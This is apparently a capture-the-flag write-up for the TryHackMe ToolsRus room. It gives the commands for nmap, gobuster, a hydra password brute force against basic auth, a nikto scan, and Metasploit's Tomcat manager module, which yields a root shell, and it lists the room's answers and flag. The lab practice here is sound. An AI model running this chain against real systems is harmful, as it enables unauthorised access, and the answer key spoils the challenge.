# TryHackMe ToolsRus CTF | Muhammad Zaid

the room Link : https://tryhackme.com/room/toolsrus

<img width="1100" height="335" alt="image" src="https://github.com/user-attachments/assets/81edfe8d-6969-4fbe-8d69-044c4fc49d33" />

The Tryhackme’s ToolsRus CTF is the great challenge for practincing tools such as

Dirbuster
Hydra
Nmap
Nikto
Metasploit
and exploit a target machine

## Step 1 Using Nmap to scan the target.

``bash
nmap -A -T4 <Target IP> -vv -oN scan.txt
``

the output:

<img width="1100" height="473" alt="image" src="https://github.com/user-attachments/assets/e6077dde-a329-46be-9c55-1d48db682993" />

<img width="1100" height="586" alt="image" src="https://github.com/user-attachments/assets/0933cccf-59b6-43e3-8ebf-b4cb4b7ec3b7" />

we can see here that i port 80 is open so it means that target is running a web server we can jsut paste the ip in the browser

## Step 2 Using GoBuster

you can use Dirbuster but for this i’m using gobuster to find hidden directories

``gobuster dir -u http://10.113.162.190 -w /usr/share/wordlists/dirb/common.txt -o recon.txt 
``
the output:

<img width="1100" height="409" alt="image" src="https://github.com/user-attachments/assets/dc80ef23-2edd-4578-9ce6-28da58ec7e44" />

we can see the hidden directories

so let’s navigate to each one by one



/guideline

i got the username from here i saved it and let’s navigate ot the

/protected

when navigating to /protected it is asking for password and we don’t know the password but we know the username so we can use hydra to brute force the password

## Step 3 Using Hydra

``bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.113.162.190 http-get /protected/  
``
the output:

<img width="1100" height="260" alt="image" src="https://github.com/user-attachments/assets/f771ece4-512c-4206-ad28-0cc279ec6553" />

and the password is bubbles

now go again to that directory and provide the Username and Password then you will see this page

<img width="1100" height="484" alt="image" src="https://github.com/user-attachments/assets/94012a9f-513b-4736-b66f-ed631e657998" />

it is saying that the protected portal has been moved to different port

remeber when we were using nmap there was a another port that is running a web server which was 1234 lets go to that port

we got this page

<img width="1100" height="485" alt="image" src="https://github.com/user-attachments/assets/ccc599aa-8239-446d-a244-4ad74583f8b8" />

## Step 4 Using Nikto

nikto is a powerful and open source web scanner tool for detecting web vulnerabilities.
in the lab we are told to scan /manager/html directory to scan with nikto using found credentials.

``bash
nikto -h http://10.113.162.190:1234/manager/html -id bob:bubbles
``
the outpu:

<img width="1100" height="460" alt="image" src="https://github.com/user-attachments/assets/849880ea-8c5f-4529-97da-89c7f1c563ae" />

and also navigate to /manager/html directory

<img width="1100" height="467" alt="image" src="https://github.com/user-attachments/assets/e14a7021-d9e6-4a3f-867d-ce29f4941bfb" />

## Step 5 Using Metasploit Framework

we can start metasploit frame work by using this command

``bash
msfconsole -q
``
and the search a exploit named tomcat

``bash
search tomcat
``

<img width="1100" height="452" alt="image" src="https://github.com/user-attachments/assets/7378283f-abeb-45d9-bb53-e5120b5d978a" />

use the module 18 by typing

``bash
use 18
``

the payload will be selected

and then run the command

``bash
show options
``
and set the following parameters

<img width="1100" height="443" alt="image" src="https://github.com/user-attachments/assets/ea31ee87-e7ae-49c4-b8ad-12dd10e09ced" />

<img width="921" height="278" alt="image" src="https://github.com/user-attachments/assets/15b302fe-920e-4f1d-b0d7-f130ac0a492d" />

and makesure in lhost you set tryhackme’s openvpn tun0 ip

and the run this command

``bash
run
``

and the meterpretter shell will be generated

<img width="843" height="592" alt="image" src="https://github.com/user-attachments/assets/aea2a588-4823-4688-b470-87da0ee9821e" />

then go to the root directory and find a flag
``bash
cd root && cat flag.txt
``

## Final Steps Answers of the questions

Q1: What directory can you find, that begins with a “g”?

Ans:
guidelines
Q2: Whose name can you find from this directory?

Ans:

bob.
Q3: What directory has basic authentication?

Ans:

/protected.
Q4: What is bob’s password to the protected part of the website?

Ans:

bubbles.
Q5: What other port that serves a webs service is open on the machine?

Ans:

1234.
Q6: What is the name and version of the software running on the port from question 5?

Apache Tomcat/7.0.88.
Q7: Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.

How many docume0

Ans:
5.
Q8: What is the server version?

Ans:

Apache/2.4.18.
Q9: What version of Apache-Coyote is this service using?

Ans:

1.1.
Q10: What user did you get a shell as?

Ans:

root.
Q11: What flag is found in the root directory?

Ans:

ff1fc4a81affcc7688cf89ae7dc6e0e1

## Connect with me 
Github : https://muhammadzaid2009-sudo  
Linkedin : https://www.linkedin.com/in/muhammad-zaid2009/  
X : https://x.com/@muhammadzaid49  
Medium : https://medium.com/@muhammadzaid2009  
Instagram : https://instagram.com/muhammadddd_zaidddd
